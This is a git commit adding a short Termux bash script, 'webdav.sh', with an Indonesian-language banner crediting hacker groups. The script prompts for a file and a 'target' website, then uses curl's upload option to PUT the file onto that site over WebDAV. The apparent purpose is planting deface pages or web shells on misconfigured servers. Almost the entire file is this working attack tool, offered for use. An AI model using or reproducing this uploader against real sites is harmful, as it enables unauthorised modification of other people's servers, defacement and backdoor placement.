7fc12dafd28b1d09d384ef7284a97780ff074682
Scriptkiddies18 <43102755+Scriptkiddies18@users.noreply.github.com>
2019-03-12 22:10:47 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,35 @@
+#!/bin/bash
+#Maap gua emang ga pro tapi gua pen belajar
+#mohon dimaapkan mastah mastah ku
+
+#package
+pkg install curl
+pkg install figlet
+gem install lolcat
+pkg install sh
+clear
+
+#coding
+figlet ScriptKiddie|lolcat
+figlet Gans|lolcat
+echo "|=============================================|"|lolcat
+echo "|                 WEBDAV                      |"|lolcat
+echo "|         THANKS FOR USE MY TOOLS             |"|lolcat
+echo "|                 Thanks To                   |"|lolcat
+echo "|             ~Look-T ~Mr.Irzen               |"|lolcat
+echo "|       ~Snep_Down ~TU4N B4DUT ~F4HRI         |"|lolcat
+echo "|       INDONESIAN TERMUX ASSOCIATION         |"|lolcat
+echo "|                 B.U.F.T                     |"|lolcat
+echo "|                  F.Q.T                      |"|lolcat
+echo "|=============================================|"|lolcat
+
+echo  "MASUKIN NAMA SCRIPT LU (TARO DI LUAR FOLDER):"|lolcat
+read Script
+echo "MASUKIN WEB TARGETNYA"|lolcat
+read site
+curl -T /sdcard/$Script $site
+echo  $site/$Script|lolcat
+echo "THANKS COME BACK AGAIN(:"|lolcat
+sleep 2
+echo "Scriptkiddie Gans TQ"|lolcat
+figlet goodbye|lolcat
